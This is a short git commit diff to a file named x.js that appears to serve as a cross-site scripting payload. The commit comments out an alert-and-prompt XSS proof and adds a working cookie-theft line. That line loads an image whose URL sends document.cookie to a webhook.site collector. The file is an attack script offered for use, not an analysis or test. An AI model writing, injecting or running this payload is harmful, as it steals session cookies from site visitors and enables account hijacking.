866062d98fd4b137b0d6eaa72fa37229b0b851b2
HotPlugin <57496383+hotplugin0x01@users.noreply.github.com>
2022-10-27 00:53:30 +0500

    Update x.js

--- x.js
+++ x.js
@@ -1,8 +1,11 @@
-function xssPayload() {
-  const alertMsg = 'xss ' + document.location;
-  console.log(alertMsg);
-  window.prompt(alertMsg);
-}
+// function xssPayload() {
+//   const alertMsg = 'xss ' + document.location;
+//   console.log(alertMsg);
+//   window.prompt(alertMsg);
+// }
 
-console.log('XSS payload executed');
-xssPayload();
+// console.log('XSS payload executed');
+// xssPayload();
+
+image = new Image();
+image.src='https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?'+document.cookie;
